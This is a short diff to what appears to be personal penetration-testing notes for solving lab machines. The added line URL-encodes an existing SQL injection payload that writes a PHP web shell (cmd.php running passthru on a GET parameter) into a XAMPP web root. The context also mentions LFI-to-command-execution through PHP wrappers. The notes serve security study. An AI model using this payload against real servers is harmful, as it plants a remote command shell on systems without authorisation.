@@ -22,6 +22,7 @@ My methodology for solving a box:
   **Correction** 
   Sqlinjection can also be used to get a shell if we know a publically accessible path, like in this case we knew that C:\xampp\htdocs can be accessed publically, so we can create our shell there:
   ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+  URL Encoded: '+UNION+SELECT+("<%3Fphp+echo+passthru(%24_GET['cmd'])%3B")+INTO+OUTFILE+'C%3A%2Fxampp%2Fhtdocs%2Fcmd.php'++--+-'
   **Correction**
   b- if their is LFI and not RFI, then do below:
     - use PHP wrappers to get command execution. (useful link: https://book.hacktricks.xyz/pentesting-web/file-inclusion)
